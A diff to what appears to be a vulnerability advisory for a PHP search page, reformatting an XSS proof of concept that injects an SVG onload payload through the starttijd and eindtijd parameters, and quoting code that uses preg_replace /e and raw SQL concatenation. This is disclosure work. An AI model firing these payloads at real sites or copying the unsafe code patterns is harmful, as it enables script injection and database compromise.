@@ -23,18 +23,18 @@ using this vulnerability an attacker can use XSS to send a malicious script to a
 
 ### POC: 
 ```
-<html>
+
 domain/do/search.php?starttijd='"--><Svg OnLoad=confirm(0)> 
 
 domain/do/search.php?eindtijd='"--><Svg OnLoad=confirm(0)>
 
-</html>
+
 ```
 
 
 ### vulnerable code: 
 
-<html>
+```
 if($starttijd&&$eindtijd){
 		$starttijd=preg_replace("/([\d]+)-([\d]+)-([\d]+) ([\d]+):([\d]+):([\d]+)/eis","mk_time('\\4','\\5', '\\6', '\\2', '\\3', '\\1')",$starttijd);
 		$eindtijd=preg_replace("/([\d]+)-([\d]+)-([\d]+) ([\d]+):([\d]+):([\d]+)/eis","mk_time('\\4','\\5', '\\6', '\\2', '\\3', '\\1')",$eindtijd);
@@ -53,7 +53,7 @@ if($starttijd&&$eindtijd){
 		$SQL.=" AND A.posttime<'$eindtijd'";
 	}
 
-</html>
+```
 
 
 
